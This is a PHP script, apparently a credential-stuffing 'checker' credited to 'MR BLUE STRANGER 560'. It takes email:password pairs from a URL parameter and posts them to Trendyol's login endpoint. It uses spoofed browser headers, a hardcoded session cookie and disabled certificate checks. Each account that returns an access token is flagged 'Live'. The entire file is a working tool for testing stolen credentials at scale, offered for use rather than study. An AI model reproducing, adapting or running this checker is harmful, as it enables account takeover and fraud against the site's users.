<?php

error_reporting(0);

function multiexplode($delimiters, $string) {
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$user = multiexplode(array(":", "|", ""), $lista)[0];
$pass = multiexplode(array(":", "|", ""), $lista)[1];



function getStr2($string, $start, $end) {
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
        $name = $matches1[1][0];
        preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
        $last = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];
        preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
        $street = $matches1[1][0];
        preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
        $city = $matches1[1][0];
        preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
        $state = $matches1[1][0];
        preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
        $phone = $matches1[1][0];
        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
        $postcode = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://auth.trendyol.com/login');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 OPR/65.0.3467.78',
'Content-Type: application/json;charset=UTF-8',
'Origin: https://auth.trendyol.com',
'Referer: https://auth.trendyol.com/static/fragment?application-id=7&storefront-id=34&culture=en-GB&language=en&debug=false',
'Connection: keep-alive',
'Cookie: AbTesting=41;AbTestingCookies=A_43-B_80-C_71-D_90-E_91-F_97-G_65-H_46-I_82-J_20-K_88-L_63-M_7-N_12-O_22;__cfruid=8cf169a0ac3b2a6cef9d6fdfe38c7291cdb4c3e0-1644188448;_cfuvid=lCm3jiDEhIAqtvrmzXSDL0fOMBfnqU79KS99ZnSLTO8-1644188448374-0-604800000;anonUserId=9fb37c60-87a0-11ec-b720-55d68f600dcf;storefrontId=34;countryCode=GB;language=en;__zlcmid=18PkggX14T2xj8U;m=1;sm=1;_gid=GA1.2.1087230168.1644188476;_gat_UA-13174585-55=1;_ga_FR1C1B8VQ7=GS1.1.1644188506.1.0.1644188506.60;_ga=GA1.1.604132231.1644188476;_fbp=fb.1.1644188507340.1579168378;_clck=maqv1m|1|eyr|0',
'Culture: en-GB',
'Application-id: 7',
'storefront-id: 34'
    ));
curl_setopt($ch, CURLOPT_POSTFIELDS, 
  '{"email":"'.$user.'","password":"'.$pass.'"}');
echo $fcb = curl_exec($ch);
////////////////////////////===[Card Response]

if (strpos($fcb, 'accessToken')) {
  echo '<span class="badge badge-success">#Onaylandı</span> '.$user.':'.$pass.' <b> ❤Live❤ ♛DeltaMedya.Tk♛ </b>';
}
 else {
  echo '<span class="badge badge-danger">💀Başarısız💀</span> '.$user.':'.$pass.' <b> 🔴 Hatalı 🔴 ♛DeltaMedya.Tk♛ </b>';
}
curl_close($ch);
ob_flush();

//////////////////////////////////////////////CHECKER MADE BY MR BLUE STRANGER 560
?>